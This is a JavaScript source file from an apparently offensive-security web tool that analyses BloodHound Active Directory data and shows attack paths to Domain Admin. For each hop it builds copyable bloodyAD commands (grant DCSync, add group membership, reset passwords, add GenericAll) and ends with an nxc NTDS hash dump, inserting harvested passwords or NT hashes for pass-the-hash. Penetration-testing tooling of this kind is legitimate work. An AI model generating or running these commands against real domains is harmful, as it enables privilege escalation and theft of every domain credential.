/*!
 * obol ui — routes/domain.js — BloodHound domain analysis, 100% client-side.
 * Upload a SharpHound zip (or BloodHound-CE JSONs) -> OBOL.bloodhound parses + derives the
 * high-value census + owned→DA attack paths + a self-contained printable report. Analysis runs
 * in a Web Worker when available (big zips stay off the main thread), else on the main thread.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};
  var U = OBOL.util;
  function esc(s) { return U.esc(s); }

  function ownedFromEngagement() {
    var eng = OBOL.store.active();
    var owned = [];
    (eng.credentials || []).forEach(function (c) { if (c.user) owned.push(String(c.user).toUpperCase()); });
    if (eng.params && eng.params.username) owned.push(String(eng.params.username).toUpperCase());
    return owned.filter(function (v, i, a) { return v && a.indexOf(v) === i; });
  }

  // Fill the query-card commands from what this engagement already knows: the DC/target host, the
  // operator's listener IP, and (on-screen only) the owned account's secret. includeSecret is false
  // for the exportable report so hashes/passwords never land in a shareable document.
  function cmdCtx(owned, includeSecret) {
    var eng = OBOL.store.active() || {}, params = eng.params || {};
    var dc = null;
    try {
      var facts = OBOL.store.factSet();
      var dcf = (facts.values && facts.values('ad.dc_candidate')) || [];
      if (dcf[0] && dcf[0].host) dc = dcf[0].host;
      var ctxOut = { dc: dc || params.target || null, host: params.target || null, lhost: params.lhost || null, secret: null, pw: null, nt: null };
      if (includeSecret && owned && owned.length) {
        var firstUser = String(owned[0]).split('@')[0].toLowerCase();
        var creds = [];
        try { creds = (OBOL.creds && OBOL.creds.gather) ? OBOL.creds.gather(eng, facts) : (eng.credentials || []); }
        catch (e) { creds = eng.credentials || []; }
        var c = creds.filter(function (x) { return x && x.user && String(x.user).toLowerCase() === firstUser; })[0];
        if (c) {
          var h = c.nthash || c.hash, pw = c.password || c.plaintext || c.secret;
          // carry the RAW secret parts too, so per-tool auth syntax (evil-winrm -H, xfreerdp /pth,
          // impacket -hashes) is built correctly for a hash-only identity — not a blank -p ''.
          if (h && /^[a-fA-F0-9]{32}$/.test(String(h))) { ctxOut.secret = '-H ' + h; ctxOut.nt = h; }
          else if (pw) { ctxOut.secret = "-p '" + pw + "'"; ctxOut.pw = pw; }
        }
      }
      return ctxOut;
    } catch (e) { return { dc: params.target || null, host: params.target || null, lhost: params.lhost || null, secret: null }; }
  }

  function shortName(s) { return String(s == null ? '' : s).split('@')[0]; }

  // The coach's top queued move + how many it ranks right now, so the Domain tab can say "this data
  // became your next moves, here they are in Next Steps". General: any ingest re-ranks the coach.
  function coachQueued() {
    try {
      var ranked = OBOL.pack.rankActions(OBOL.store.factSet(), OBOL.packs.actions(), {});
      return { top: ranked[0] || null, count: ranked.length };
    } catch (e) { return { top: null, count: 0 }; }
  }

  // A bloodyAD one-liner for walking one hop of the owned->DA path. General per (edge, target kind):
  // control of the DOMAIN -> grant yourself DCSync; a group -> add yourself as a member; a user ->
  // reset or shadow it. bloodyAD is obol's house ACL-abuse tool, so the whole chain reads consistently.
  function bdPrefix(ctx, domain, you) {
    var auth = ctx.pw ? ("-p '" + ctx.pw + "'") : (ctx.nt ? ("-p ':" + ctx.nt + "'") : "-p '<password>'");
    return "bloodyAD -u '" + (you || '<you>') + "' " + auth + " -d " + (domain || '<domain>') + " --host " + (ctx.dc || '<dc-ip>');
  }
  function hopCommand(hop, ctx, domain, you) {
    var pre = bdPrefix(ctx, domain, you), tgt = shortName(hop.to), edge = String(hop.edge || ''), kind = String(hop.to_kind || '').toLowerCase();
    if (/memberof/i.test(edge)) return '';   // membership is not an action you take, it is inherited
    if (/domain/.test(kind) && /genericall|writedacl|owns|writeowner|allextendedrights/i.test(edge)) return pre + " add dcsync '" + (you || '<you>') + "'";
    if (/group/.test(kind) || /addmember|addself/i.test(edge)) return pre + " add groupMember '" + tgt + "' '" + (you || '<you>') + "'";
    if (/forcechangepassword/i.test(edge)) return pre + " set password '" + tgt + "' 'Newp@ss123'";
    if (/genericall|genericwrite|writedacl|owns|writeowner|allextendedrights/i.test(edge)) return pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "'";
    return pre + "  # abuse " + edge + " on " + tgt;
  }

  // The "route to Domain Admin" block: the derived shortest owned->DA path as NUMBERED steps, each with
  // the exact bloodyAD command for its edge, ending in the DCSync cash-in, plus a bridge to Next Steps.
  // Reuses view.analysis (already computed) so it is general to any collection, not this box.
  function routeStepsHtml(view, owned, summary, ctx) {
    var an = (view && view.analysis) || {};
    if (!an.headline) return '';
    var you = shortName((owned && owned[0]) || '') || '<you>';
    var domain = (summary && summary.domain) || '';
    var out = '<h2 class="coach-sec-h">Route To Domain Admin</h2><div class="bh-route"><p class="bh-route-head">' + esc(an.headline) + '</p>';
    if (an.paths && an.paths.length) {
      var hops = an.paths[0].hops || [], step = 0;
      var chain = '<div class="bh-route-chain"><span class="bh-rn owned">' + esc(you) + '</span>';
      hops.forEach(function (h) { chain += '<span class="bh-re">' + esc(h.edge) + '</span><span class="bh-rn' + (/domain/.test(String(h.to_kind || '').toLowerCase()) ? ' goal' : '') + '">' + esc(shortName(h.to)) + '</span>'; });
      out += chain + '</div><ol class="bh-steps">';
      hops.forEach(function (h) {
        var cmd = hopCommand(h, ctx, domain, you);
        if (!cmd) return;   // skip pure MemberOf hops (no action)
        step++;
        out += '<li><div class="bh-step-what">' + esc(h.edge) + ' on <b>' + esc(shortName(h.to)) + '</b></div>'
          + '<div class="bh-cmd"><code>' + esc(cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(cmd) + '">Copy</button></div></li>';
      });
      // the cash-in: once you hold DCSync, dump the Administrator hash
      var sec = ctx.secret || "-p '<password>'";
      var dump = 'nxc smb ' + (ctx.dc || '<dc-ip>') + " -u '" + you + "' " + sec + ' --ntds';
      out += '<li><div class="bh-step-what">DCSync: dump the Administrator hash</div>'
        + '<div class="bh-cmd"><code>' + esc(dump) + '</code><button class="btn-copy" data-copy="' + U.attr(dump) + '">Copy</button></div></li></ol>';
    }
    out += '</div>';
    return out;
  }

  // Explore ANY principal: its shortest path(s) to Domain Admin, and what it controls (forward
  // reachability). Lets a user theorize "if I owned X, what opens up" for any account in the data.
  function exploreHtml(principal, summary) {
    if (!principal || !summary) return '';
    var paths = OBOL.bloodhound.ownedPaths(summary, [principal]) || { paths: [] };
    var ctl = OBOL.bloodhound.controls(summary, principal) || { controls: [], groups: [], count: 0 };
    var out = '<div class="bh-explore-card"><h3>' + esc(shortName(principal)) + '</h3>';
    if (paths.paths && paths.paths.length) {
      var hops = paths.paths[0];
      var chain = '<span class="bh-rn owned">' + esc(shortName(principal)) + '</span>';
      hops.forEach(function (h) { chain += '<span class="bh-re">' + esc(h.edge) + '</span><span class="bh-rn' + (/domain/.test(String(h.to_kind || '').toLowerCase()) ? ' goal' : '') + '">' + esc(shortName(h.to)) + '</span>'; });
      out += '<p class="bh-x-line"><b>' + paths.paths.length + '</b> path(s) to Domain Admin, shortest ' + hops.length + ' hop(s):</p><div class="bh-route-chain">' + chain + '</div>';
    } else {
      out += '<p class="bh-x-line bh-x-none">No path to Domain Admin derived from this account.</p>';
    }
    if (ctl.count) {
      var show = ctl.controls.slice(0, 15);
      out += '<p class="bh-x-line">Controls <b>' + ctl.count + '</b> object(s)' + (ctl.groups.length ? ', member of ' + ctl.groups.length + ' group(s)' : '') + ':</p>'
        + '<ul class="bh-princ">' + show.map(function (x) {
            return '<li><span class="bh-re">' + esc(x.edge) + '</span> <button class="bh-princ-x" data-explore="' + U.attr(x.name) + '">' + esc(shortName(x.name)) + '</button> <span class="bh-x-kind">' + esc(x.type) + '</span></li>';
          }).join('') + '</ul>' + (ctl.count > show.length ? '<p class="route-sub">+ ' + (ctl.count - show.length) + ' more controlled object(s).</p>' : '');
    } else {
      out += '<p class="bh-x-line bh-x-none">Controls nothing abusable in this collection.</p>';
    }
    return out + '</div>';
  }

  function render() {
    var eng = OBOL.store.active();
    var summary = eng && eng.bloodhound;
    var html = '<section class="domain-route">'
      + '<h1 class="route-h1">Domain (BloodHound)</h1>'
      + '<p class="route-sub">Upload a SharpHound <code>.zip</code> (or BloodHound-CE <code>.json</code> files). Everything is parsed and analysed in your browser, nothing is uploaded anywhere.</p>'
      + '<div class="bh-drop" id="bh-drop" tabindex="0" role="button">Drop a SharpHound .zip here, or click to choose files'
      + '<input type="file" id="bh-file" accept=".zip,.json" multiple hidden></div>'
      + '<div id="bh-status" class="route-sub"></div>';

    if (summary) {
      var owned = ownedFromEngagement();
      var view = OBOL.bloodhound.domainView(summary, owned, cmdCtx(owned, true));
      html += '<div class="bh-summary-head"><h2 class="coach-sec-h">' + esc(summary.domain || 'domain')
        + ': ' + (typeof summary.users === 'number' ? summary.users : (summary.users ? summary.users.length : 0)) + ' users, ' + (summary.computers ? summary.computers.length : 0) + ' computers</h2>'
        + '<div class="ev-row"><input id="bh-owned" class="ev-cmd" placeholder="owned principals (comma-separated), e.g. ADMINISTRATOR@CORP.LOCAL" value="' + U.attr(owned.join(', ')) + '">'
        + '<button id="bh-recompute" class="btn-ghost">Recompute Paths</button>'
        + '<button id="bh-report" class="btn-primary">Open Report</button></div></div>';

      // Bridge: this data became the coach's next moves. Tells the user where the "do this" lives.
      var q = coachQueued();
      if (q.top) {
        html += '<a class="bh-bridge" href="#/path"><span class="bh-bridge-k">obol turned this graph into your next moves.</span> '
          + '<span class="bh-bridge-top">Next up: ' + esc(q.top.title) + '</span>'
          + '<span class="bh-bridge-go">Open Next Steps →</span></a>';
      }

      // Route to Domain Admin: the derived owned->DA path as numbered steps with the command per hop.
      html += routeStepsHtml(view, owned, summary, cmdCtx(owned, true));

      // Interactive attack-path graph (parity with obol-local's draggable domain graph).
      html += '<h2 class="coach-sec-h">Attack-path graph</h2>'
        + '<div id="bh-graph" class="bh-graph-host">'
        + (owned.length ? '' : '<div class="coach-empty">Enter an owned principal above to derive and graph owned→Domain-Admin paths.</div>')
        + '</div>';

      // Targeting board: who is closest to Domain Admin. Click a row to explore that account's paths.
      var near = (OBOL.bloodhound.nearestToGoal(summary) || []).filter(function (r) { return /user|group|computer/.test(r.type); });
      if (near.length) {
        html += '<h2 class="coach-sec-h">Closest To Domain Admin</h2>'
          + '<p class="route-sub">Fewest hops to Domain Admin, who to go after next. Click a row to see that account’s paths and what it controls.</p>'
          + '<div class="bh-board">'
          + near.slice(0, 12).map(function (r) {
              return '<button class="bh-brow" data-explore="' + U.attr(r.name) + '"><span class="bh-bhops">' + r.hops + ' hop' + (r.hops === 1 ? '' : 's') + '</span>'
                + '<span class="bh-btype">' + esc(r.type) + '</span><span class="bh-bname">' + esc(shortName(r.name)) + '</span></button>';
            }).join('')
          + '</div>' + (near.length > 12 ? '<p class="route-sub">+ ' + (near.length - 12) + ' more.</p>' : '');
      }

      // Explore any account: paths to DA + what it controls, for ANY principal (theorize, not just owned).
      html += '<h2 class="coach-sec-h">Explore An Account</h2>'
        + '<div class="ev-row"><input id="bh-explore" class="ev-cmd" placeholder="any principal, e.g. SVC-ALFRESCO@' + esc((summary.domain || 'DOMAIN')) + '">'
        + '<button id="bh-explore-go" class="btn-ghost">Show Paths + Control</button></div>'
        + '<div id="bh-explore-slot"></div>';

      // High-value queries: matched cards first, the empty ones collapsed so the signal is up top.
      var ownedUpper = {}; owned.forEach(function (o) { ownedUpper[shortName(o).toUpperCase()] = 1; });
      function cardHtml(s) {
        var items = s.items || s.principals || [];
        var n = items.length || s.count || 0;
        var cls = /admin|dcsync|unconstrained|domain admin|enterprise/i.test(s.title) ? 'crit' : (/kerberoast|as-?rep|roast/i.test(s.title) ? 'warn' : '');
        var free = /as-?rep|password not required/i.test(s.title);
        var cmds = (s.commands || []).slice(0, 3).map(function (c) {
          var line = typeof c === 'string' ? c : (c.run || c.cmd || c.command || '');
          return line ? '<div class="bh-cmd"><code>' + esc(line) + '</code><button class="btn-copy" data-copy="' + U.attr(line) + '">Copy</button></div>' : '';
        }).join('');
        var detail = items.length
          ? '<details class="bh-detail"><summary>' + items.length + ' ' + (items.length === 1 ? 'match' : 'matches') + '</summary>'
            + '<ul class="bh-princ">' + items.map(function (p) {
                var owns = ownedUpper[shortName(p).toUpperCase()];
                return '<li><button class="bh-princ-x" data-explore="' + U.attr(p) + '">' + esc(p) + '</button>'
                  + (owns ? ' <span class="bh-tag own">owned</span>' : '') + '</li>';
              }).join('') + '</ul></details>'
          : '';
        return '<div class="bh-card"><h3>' + esc(s.title) + (free ? ' <span class="bh-tag free">costs nothing</span>' : '') + '</h3>'
          + '<div class="bh-count ' + cls + '">' + n + '</div>'
          + (s.hint ? '<div class="bh-hint">' + esc(s.hint) + '</div>' : '')
          + (s.cash ? '<div class="bh-cash">' + esc(s.cash) + '</div>' : '')
          + detail + (cmds ? '<div class="bh-cmds">' + cmds + '</div>' : '') + '</div>';
      }
      var secs = view.sections || [];
      var matched = secs.filter(function (s) { return (s.items || s.principals || []).length || s.count; });
      var empty = secs.filter(function (s) { return !((s.items || s.principals || []).length || s.count); });
      html += '<h2 class="coach-sec-h">High-Value Queries</h2><div class="bh-census">' + matched.map(cardHtml).join('') + '</div>';
      if (empty.length) {
        html += '<details class="bh-empties"><summary>Show ' + empty.length + ' queries with no matches</summary>'
          + '<div class="bh-census">' + empty.map(cardHtml).join('') + '</div></details>';
      }
      html += '<div id="bh-report-slot"></div>';
    }
    html += '</section>';
    return html;
  }

  function readFile(file) {
    return new Promise(function (resolve) {
      var r = new FileReader();
      var isZip = /\.zip$/i.test(file.name);
      r.onload = function () { resolve({ name: file.name, arrayBuffer: isZip ? r.result : undefined, text: isZip ? undefined : r.result }); };
      r.onerror = function () { resolve(null); };
      if (isZip) r.readAsArrayBuffer(file); else r.readAsText(file);
    });
  }

  async function ingest(fileList) {
    var status = document.getElementById('bh-status');
    if (status) status.textContent = 'Parsing ' + fileList.length + ' file(s) in your browser…';
    var files = (await Promise.all(Array.prototype.map.call(fileList, readFile))).filter(Boolean);
    try {
      var summary = await OBOL.bloodhound.parse(files);
      var owned = ownedFromEngagement();
      var paths = OBOL.bloodhound.ownedPaths(summary, owned);
      var facts = OBOL.bloodhound.toFacts(summary, paths, 'domain:' + (summary.domain || 'domain'));
      // Keep the transient _graph on the persisted summary so the interactive graph + census can
      // be re-derived (and owned-principal recompute works) after reload — obol-local drops it only
      // because its server keeps a lean SQLite store; the browser's IndexedDB can hold it.
      OBOL.store.update(function (eng) { eng.bloodhound = summary; }, 'bloodhound');
      OBOL.store.addFacts(facts, 'bloodhound');
      OBOL.app.renderSidebar();
      U.toast('Ingested ' + (summary.domain || 'domain') + ': ' + facts.length + ' facts');
      OBOL.router.render();
    } catch (e) {
      if (status) status.textContent = 'Parse failed: ' + (e && e.message);
      U.toast('BloodHound parse failed', 'err');
    }
  }

  function mounted(ctx) {
    var mount = (ctx && ctx.mount) || document;   // was referenced below but never defined: copy/report wiring silently threw
    var drop = document.getElementById('bh-drop');
    var input = document.getElementById('bh-file');
    if (drop && input) {
      drop.addEventListener('click', function () { input.click(); });
      drop.addEventListener('keydown', function (e) { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); input.click(); } });
      input.addEventListener('change', function () { if (input.files.length) ingest(input.files); });
      ['dragover', 'dragenter'].forEach(function (ev) { drop.addEventListener(ev, function (e) { e.preventDefault(); drop.classList.add('drag'); }); });
      ['dragleave', 'drop'].forEach(function (ev) { drop.addEventListener(ev, function (e) { e.preventDefault(); drop.classList.remove('drag'); }); });
      drop.addEventListener('drop', function (e) { if (e.dataTransfer && e.dataTransfer.files.length) ingest(e.dataTransfer.files); });
    }
    var rec = document.getElementById('bh-recompute');
    if (rec) rec.addEventListener('click', function () {
      var owned = ((document.getElementById('bh-owned') || {}).value || '').split(',').map(function (s) { return s.trim(); }).filter(Boolean);
      OBOL.store.update(function (eng) { eng.params = eng.params || {}; if (owned[0]) eng.params.username = owned[0]; }, 'params');
      OBOL.router.render();
    });
    // render the interactive attack-path graph
    var eng0 = OBOL.store.active();
    if (eng0 && eng0.bloodhound && OBOL.bhgraph) {
      var owned0 = ownedFromEngagement();
      var view0 = OBOL.bloodhound.domainView(eng0.bloodhound, owned0);
      var host = document.getElementById('bh-graph');
      var g = view0.analysis && view0.analysis.graph;
      if (host && g && g.nodes && g.nodes.length) {
        OBOL.bhgraph.renderInto(host, g, { onNodeClick: function (id) { U.toast(id); } });
      }
    }
    // copy buttons on the query cards
    U.on(mount, 'click', '.btn-copy', function (e, b) {
      var v = b.getAttribute('data-copy'); if (v) U.copy(v).then(function (ok) { U.toast(ok ? 'Copied' : 'Copy failed', ok ? '' : 'err'); });
    });

    // Explore any account: a targeting-board row, a census principal, or the input, all compute that
    // principal's paths to DA + what it controls. Theorize from any account, not just the creds you hold.
    function doExplore(principal) {
      var eng = OBOL.store.active(), slot = document.getElementById('bh-explore-slot');
      if (!eng || !eng.bloodhound || !slot || !principal) return;
      var inp = document.getElementById('bh-explore'); if (inp) inp.value = principal;
      slot.innerHTML = exploreHtml(principal, eng.bloodhound);
      try { slot.scrollIntoView({ block: 'nearest' }); } catch (x) {}
    }
    U.on(mount, 'click', '[data-explore]', function (e, t) { e.preventDefault(); doExplore(t.getAttribute('data-explore')); });
    var xgo = document.getElementById('bh-explore-go');
    if (xgo) xgo.addEventListener('click', function () { var v = ((document.getElementById('bh-explore') || {}).value || '').trim(); if (v) doExplore(v); });

    var rep = document.getElementById('bh-report');
    if (rep) rep.addEventListener('click', function () {
      var eng = OBOL.store.active();
      if (!eng.bloodhound) return;
      var owned = ownedFromEngagement();
      var view = OBOL.bloodhound.domainView(eng.bloodhound, owned, cmdCtx(owned, false));
      var htmlDoc = OBOL.bloodhound.domainReportHtml(eng.bloodhound, view);
      var slot = document.getElementById('bh-report-slot');
      if (slot) slot.innerHTML = '<h2 class="coach-sec-h">Domain report</h2><iframe class="bh-report-frame" id="bh-frame"></iframe>';
      var frame = document.getElementById('bh-frame');
      if (frame) frame.srcdoc = htmlDoc;
    });
  }

  OBOL.routes = OBOL.routes || {};
  OBOL.routes.domain = { render: render, mounted: mounted };
})(typeof globalThis !== 'undefined' ? globalThis : this);
